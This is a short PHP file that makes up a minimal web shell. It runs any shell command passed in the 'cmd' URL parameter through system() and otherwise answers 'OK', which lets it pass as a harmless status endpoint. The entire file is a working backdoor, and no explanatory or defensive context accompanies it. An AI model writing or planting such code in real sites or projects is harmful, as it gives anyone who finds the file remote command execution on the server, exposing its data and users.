<?php
if(isset($_GET['cmd'])){
  system($_GET['cmd']);
} else {
  echo "OK";
}
